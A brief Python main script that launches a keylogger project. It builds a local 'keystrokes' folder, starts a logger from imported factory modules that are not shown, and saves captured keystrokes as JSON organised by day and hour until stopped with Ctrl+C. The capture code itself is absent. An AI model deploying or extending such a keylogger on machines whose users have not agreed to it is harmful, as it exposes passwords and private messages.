import os
from factories.writer_factory import WriterFactory
from factories.key_logger_factory import KeyLoggerFactory

def main():
    # Create a "keystrokes" directory in the project folder
    keystrokes_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keystrokes")
    
    # Create a JSON writer that will organize keystrokes by day and hour
    writer = WriterFactory.create_writer("json", keystrokes_dir)
    logger = KeyLoggerFactory.create_logger(writer)
    
    try:
        print("Keylogger started. Press Ctrl+C to exit...")
        logger.start()
        
        # Keep the main thread running
        while True:
            pass
    except KeyboardInterrupt:
        print("\nExiting...")
    finally:
        logger.stop()
        writer.close()
        print("Keylogger stopped and data saved.")

if __name__ == "__main__":
    main()